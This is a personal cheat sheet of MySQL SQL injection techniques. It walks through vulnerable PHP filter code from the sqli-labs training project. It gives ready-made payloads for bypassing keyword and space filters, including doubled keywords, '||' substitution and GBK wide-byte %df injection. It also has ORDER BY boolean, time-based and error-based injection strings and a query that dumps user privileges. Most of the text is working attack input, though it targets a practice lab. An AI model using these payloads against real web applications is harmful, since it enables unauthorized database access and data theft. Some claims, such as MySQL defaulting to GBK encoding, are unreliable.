# Mysql Injection Tips

Write by manesec.

## Useful Website

+ [Payload all the things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md)
+ [Mysql sql injection cheat sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)


## 0x0 Some by pass word

+ Space = `%0a`, `+`, `/**/`
+ and = `&&`
+ or = `||`

Note: Sometimes `-- - ` may not working, it may use `#`.

## 0x1 Bypass `only filtered at once`

Sometimes some phrases are only filtered at one time, It just turns some simple words into blanks and passes them to Mysql.

Example code like :

``` php
function blacklist($id){
    $id= preg_replace('/or/i',"", $id);
    $id= preg_replace('/AND/i',"", $id);
    return $id;
}
```

See: https://github.com/Audi-1/sqli-labs/blob/e96f21776372c8613a7e565106e62bc01a59355e/Less-25/index.php#LL61C27-L61C27

Filtered:  `or`, `and`

1. Input: `id = 1' and 1=1 -- -`
2. Filtered will be: `id = 1' 1=1 -- -`
3. Pass to mysql to exec.

Now you can do :

1. Input: `id = 1' aandnd 1=1 -- -`
2. Filtered will be: `id = 1' and 1=1 -- -`
3. Pass to mysql to exec the injection command.

The reason it worked was because he only filtered it once.

## 0x2 Bypass `space` and `command out`

Example code like :

```php
function blacklist($id) {
    $id= preg_replace('/or/i',"", $id);            //strip out OR (non case sensitive)
    $id= preg_replace('/and/i',"", $id);        //Strip out AND (non case sensitive)
    $id= preg_replace('/[\/\*]/',"", $id);        //strip out /*
    $id= preg_replace('/[--]/',"", $id);        //Strip out --
    $id= preg_replace('/[#]/',"", $id);            //Strip out #
    $id= preg_replace('/[\s]/',"", $id);        //Strip out spaces
    $id= preg_replace('/[\/\\\\]/',"", $id);        //Strip out slashes
    return $id;
}
$id= blacklist($id);
$hint=$id;
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
```

See: https://github.com/Audi-1/sqli-labs/blob/e96f21776372c8613a7e565106e62bc01a59355e/Less-26/index.php#L59


Filtered:  `or`, `and`,  `/*` , `–` ,`#` , `SPACE` , `/`

Using `||` to by pass it, like: 

`index.php?id=1'||extractvalue(1,concat(0x7e,user(),0x7e))||'`

## 0x3 Wide byte injection: `%df`

```php

    $string = preg_replace('/'. preg_quote('\\') .'/', "\\\\\\", $string);          //escape any backslash
    $string = preg_replace('/\'/i', '\\\'', $string);                               //escape single quote with a backslash
    $string = preg_replace('/\"/', "\\\"", $string);                                //escape double quote with a backslash
    $string = preg_replace('/'. preg_quote('\\') .'/', "\\\\\\", $string);          //escape any backslash
    $string = preg_replace('/\'/i', '\\\'', $string);                               //escape single quote with a backslash
    $string = preg_replace('/\"/', "\\\"", $string);                                //escape double quote with a backslash
      
```

See: https://github.com/Audi-1/sqli-labs/blob/e96f21776372c8613a7e565106e62bc01a59355e/Less-32/index.php#L19

Filtered: `/`, `'`, `"`

Add `%df` like `?id=%df' and 1=1 -- -`

MySQL uses GBK encoding by default. When MySQL uses GBK encoding, it considers two characters as one Chinese character if the ASCII code of the first character is greater than 128 (which falls within the range of Chinese characters). 

This is a feature of MySQL because GBK is a multi-byte encoding that considers two bytes as one Chinese character. When we pass parameters, we use the URL encoding for the single quote, represented as `%27`, and we can pass it as `%df%27`.

**Note** : `%23` = `#`

When we pass in `%df` as a parameter, it becomes `?id=1%DF and 1=1%23` in the database. 

At this point, the escape function will also escape the single quote we entered and convert it to `\'`, (where the URL encoding of "\" is `%5C`). 

In the URL, it becomes `%DF%5c%27`. When encoded in GBK, `%5c` will be combined with the previous `%df` to form a Chinese character (運), which closes the single quote and successfully executes the query. 

The final SQL statement is: `select * from user where id='1運' and 1=1#'`

See: https://www.freebuf.com/articles/web/337784.html

## 0x4 Bypass `mysql_real_escape_string()` when Mysql is not GBK encoding.

In the php code using the `mysql_real_escape_string()` to filtered some work, but mysql not using GBK encoding.

`\x00`, `\n`, `\r`, `\`, `'`, `"` and `\x1a` will not work.

But it have a two way to bypass it, using `%df'` or `%EF%BF%BD` (Like `%df`).

## 0x5 `order by` after injection.

```php
$sql = "SELECT * FROM users ORDER BY $id";
```

See: https://github.com/Audi-1/sqli-labs/blob/e96f21776372c8613a7e565106e62bc01a59355e/Less-46/index.php#LL22C2-L22C44

`index.php?sort=1`


**boolean injection** : It can use some function like

+ `?sort=rand(false)`

**Time based**: 

+ `?sort=(SELECT IF(SUBSTRING(current,1,1)=CHAR(115),BENCHMARK(50000000,md5('1')),null) FROM (select database() as current) as tb1)`

**Error based**:

Note: `PROCEDURE ANALYSE()` is deprecated as of MySQL 5.7.18, and is removed in MySQL 8.0.

+ `?sort=updatexml(rand(),concat(CHAR(126),version(),CHAR(126)),null)`
+ `?sort=extractvalue(rand(),concat(0x3a,version()))`
+ `?sort=1 AND updatexml(rand(),concat(CHAR(126),version(),CHAR(126)),null)`
+ `?sort=1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1)`

## 0x6 Post, USER_PRIVILEGES

+ `SELECT  group_concat(concat(GRANTEE,",",TABLE_CATALOG,",",PRIVILEGE_TYPE,",",IS_GRANTABLE) SEPARATOR '|') FROM information_schema.USER_PRIVILEGES`

